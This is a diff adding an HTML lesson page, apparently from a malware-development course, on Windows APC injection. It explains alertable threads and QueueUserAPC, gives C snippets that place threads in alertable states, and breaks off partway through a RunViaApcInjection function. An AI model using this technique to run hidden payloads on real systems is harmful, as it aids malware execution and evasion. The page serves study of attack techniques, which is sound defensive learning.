@@ -1,0 +1,260 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>APC Injection</title><link rel="stylesheet" href="../../content.css"><script src="../../content.js" defer></script></head><body><main class="lesson">
+        <div id="apc-injection" class="scroll-mt-24 pt-6 sm:pt-8 pb-3 border-b border-[#212b54] mt-8 sm:mt-12 mb-4 sm:mb-6 flex items-center justify-between group">
+            <h2 class="text-xl sm:text-2xl font-bold text-white tracking-tight flex items-center gap-2.5 sm:gap-3">
+                <i data-lucide="sparkles" class="w-4 h-4 sm:w-5 sm:h-5 text-[var(--accent)] flex-shrink-0"></i>
+                <span>APC Injection</span>
+            </h2>
+            <a href="#apc-injection" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition" class="opacity-0 group-hover:opacity-100 text-[#cbd5e1] hover:text-[var(--accent)] text-xs flex items-center gap-1 font-mono transition p-1.5 rounded hover:bg-[var(--accent-soft)]" title="Copy link">
+                <i data-lucide="link" class="w-4 h-4"></i>
+            </a>
+        </div><h3 id="introduction" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Introduction</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This module introduces another way to run a payload without having to create a new thread. This technique is known as APC injection.</p><h3 id="what-is-apc" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>What is APC?</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><a href="https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">Asynchronous Procedure Calls</a> are a Windows operating system mechanism that enables programs to execute tasks asynchronously while continuing to run other tasks. APCs are implemented as kernel-mode routines that are executed in the context of a specific thread. Malware can leverage APCs to queue a payload and then have it execute when scheduled.</p><h3 id="alertable-state" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Alertable State</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Not all threads can run a queued APC function, only threads in an <em>alertable state</em> can do so. An alertable state thread is a thread that is in a wait state. When a thread enters an alertable state it is placed in a queue of alertable threads, allowing it to run queued APC functions.</p><h3 id="what-is-apc-injection" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>What is APC Injection?</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">To queue an APC function to a thread, the address of the APC function must be passed to the <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">QueueUserAPC</a> WinAPI. According to Microsoft&#x27;s documentation:</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><em>An application queues an APC to a thread by calling the QueueUserAPC function. The calling thread specifies the address of an APC function in the call to QueueUserAPC.</em></p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The injected payload&#x27;s address will be passed to <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">QueueUserAPC</code> in order to have it executed. Before doing so, a thread in the local process must be placed in an alertable state.</p><h3 id="queueuserapc" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>QueueUserAPC</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">QueueUserAPC</code> is shown below and it accepts 3 arguments:</p><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">pfnAPC</code> - The address of the APC function to be called.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">hThread</code> - A handle to an alertable thread or suspended thread.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">dwData</code> - If the APC function requires parameters, they can be passed here. This value will be <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NULL</code> in this module&#x27;s code.</span></div>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">DWORD QueueUserAPC(
+  [in] PAPCFUNC  pfnAPC,
+  [in] HANDLE    hThread,
+  [in] ULONG_PTR dwData
+);</code></pre>
+        </div><h3 id="placing-a-thread-in-an-alertable-state" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Placing a Thread In An Alertable State</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The thread that will be executing the queued function needs to be in an alertable state. This can be done by creating a thread and using one of the following WinAPIs:</p><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><a href="https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-sleep" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">Sleep</a></span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><a href="https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-sleepex" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">SleepEx</a></span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><a href="https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-msgwaitformultipleobjects" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">MsgWaitForMultipleObjects</a></span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><a href="https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-msgwaitformultipleobjectsex" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">MsgWaitForMultipleObjectsEx</a></span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><a href="https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">WaitForSingleObject</a></span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><a href="https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobjectex" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">WaitForSingleObjectEx</a></span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><a href="https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitformultipleobjects" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">WaitForMultipleObjects</a></span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><a href="https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitformultipleobjectsex" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">WaitForMultipleObjectsEx</a></span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><a href="https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-signalobjectandwait" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">SignalObjectAndWait</a></span></div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">These functions are used for synchronizing threads and improving performance and responsiveness in applications, however in this case, passing a handle to a dummy event is sufficient. Passing the correct parameters to these functions is not necessary since simply using one of the functions is enough to place the thread in an alertable state.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">To create a dummy event, the <a href="https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-createeventw" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">CreateEvent</a> WinAPI will be used. The newly created event object is a synchronization object that allows threads to communicate with each other by signaling and waiting for events. Since the output of <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">CreateEvent</code> is irrelevant, any valid event can be passed to the previously shown WinAPIs.</p><h3 id="using-the-functions" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Using The Functions</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Any of the following functions can be used as a sacrificial alertable thread to run the queued APC payload. See below for examples of how to use the functions to place the current thread in an alertable state.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><strong>Using </strong><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all"><strong>Sleep</strong></code></p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">VOID AlertableFunction1() {
+
+	Sleep(-1);
+}</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><strong>Using </strong><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all"><strong>SleepEx</strong></code></p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">VOID AlertableFunction2() {
+
+	SleepEx(INFINITE, TRUE);
+}</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><strong>Using </strong><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all"><strong>WaitForSingleObject</strong></code></p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">VOID AlertableFunction3() {
+
+	HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);
+	if (hEvent){
+		WaitForSingleObject(hEvent, INFINITE);
+		CloseHandle(hEvent);
+	}
+}</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><strong>Using </strong><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all"><strong>MsgWaitForMultipleObjects</strong></code></p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">VOID AlertableFunction4() {
+
+	HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);
+	if (hEvent) {
+		MsgWaitForMultipleObjects(1, &amp;hEvent, TRUE, INFINITE, QS_INPUT);
+		CloseHandle(hEvent);
+	}
+}</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><strong>Using </strong><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all"><strong>SignalObjectAndWait</strong></code></p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">VOID AlertableFunction5() {
+
+	HANDLE hEvent1 = CreateEvent(NULL, NULL, NULL, NULL);
+	HANDLE hEvent2 = CreateEvent(NULL, NULL, NULL, NULL);
+
+	if (hEvent1 &amp;&amp; hEvent2) {
+		SignalObjectAndWait(hEvent1, hEvent2, INFINITE, TRUE);
+		CloseHandle(hEvent1);
+		CloseHandle(hEvent2);
+	}
+}</code></pre>
+        </div><h3 id="suspended-threads" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Suspended Threads</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">QueueUserAPC</code> can also succeed if the target thread is created in a suspended state. If this method is used to execute the payload, <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">QueueUserAPC</code> should be called first and then the suspended thread should be resumed next. Again, the thread must be created in a suspended state, suspending an existing thread will not work.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The code shared in this module demonstrates APC injection via an alertable and suspended thread.</p><h3 id="apc-injection-implementation-logic" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>APC Injection Implementation Logic</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">To summarize, the implementation logic will be as follows:</p><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>First, create a thread that runs one of the previously mentioned functions to place it in an alertable state.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>Inject the payload into memory.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>The thread handle and payload base address will be passed as input parameters to <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">QueueUserAPC</code>.</span></div><h3 id="apc-injection-function" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>APC Injection Function</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">RunViaApcInjection</code> is a function that performs APC Injection and requires 3 arguments:</p><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">hThread</code> - A handle to an alertable or suspended thread.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">pPayload</code> - A pointer to the payload&#x27;s base address.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">sPayloadSize</code> - The size of the payload.</span></div>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">BOOL RunViaApcInjection(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
+
+	PVOID pAddress = NULL;
+	DWORD dwOldProtection = NULL;
+
+
+	pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (pAddress == NULL) {
+		printf(&quot;\t[!] VirtualAlloc Failed With Error : %d \n&quot;, GetLastError());
